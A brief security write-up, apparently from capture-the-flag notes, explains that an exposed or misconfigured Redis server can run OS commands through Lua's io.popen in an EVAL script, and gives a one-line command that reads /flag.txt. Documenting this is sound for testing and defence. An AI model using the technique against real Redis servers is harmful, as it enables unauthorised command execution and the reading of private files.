---
title: "Reading a File in Redis-CLI Interactive Shell"
date: 2026-01-13
tags: ['security', 'redis', 'post-exploitation', 'lua-scripting', 'redis-exploitation']
---

Redis allows the execution of Lua scripts through the `EVAL` command. If Redis is misconfigured or exposed to attackers, the Lua scripting engine can be used to execute arbitrary commands, including reading files on the system.

### File Read via `EVAL` Command

You can read the contents of a file (e.g., `/flag.txt`) using the `EVAL` command in the Redis interactive shell:

```bash
EVAL "return io.popen('cat /flag.txt'):read('*a')" 0
```